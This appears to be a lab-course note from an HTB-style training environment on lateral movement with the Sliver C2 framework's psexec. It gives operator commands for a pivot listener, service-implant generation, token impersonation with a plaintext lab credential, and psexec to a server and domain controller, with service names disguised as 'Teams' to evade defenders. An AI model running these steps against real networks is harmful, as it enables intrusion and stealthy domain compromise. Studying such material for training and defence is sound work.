# 15.16 Lateral Movement PsExec via Sliver

> Drop a service binary on ADMIN$ via Sliver's `psexec` — needs a `make-token` and a pre-running TCP pivot listener.

## Overview

Sliver's `psexec` uploads a service-format binary to ADMIN$ and creates/starts/removes a Windows service. It requires an impersonated token (make-token) and a TCP pivot listener already running on the pivot host. The service name and description should be set to blend in.

## Steps

- Start a TCP pivot listener on the pivot host's internal IP.
- Generate a `--format service` implant pointing at the pivot listener.
- Impersonate the target user with `make-token` before running psexec.
- `psexec --custom-exe <binary> --service-name <name> --service-description <desc> <target>` executes.
- Resulting session arrives via pivot chain: `10.x.x.x:port->http-beacon->(hostname)`.
- Default upload path is C:\Windows\Temp with a random 10-char filename — monitored by defenders.

## Commands

### Start TCP pivot listener

```text
sliver (http-beacon) > pivots tcp --bind <TARGET>
```

### Generate service implant

```text
sliver (http-beacon) > generate --format service -i <TARGET>:9898 --skip-symbols -N psexec-pivot
```

### Impersonate svc_sql

```text
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
```

### PsExec to SRV01

```text
sliver (http-beacon) > psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local
```

### PsExec to DC01 (after Rubeus TGT injection)

```text
sliver (http) > psexec --custom-exe psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams dc01.child.htb.local
```
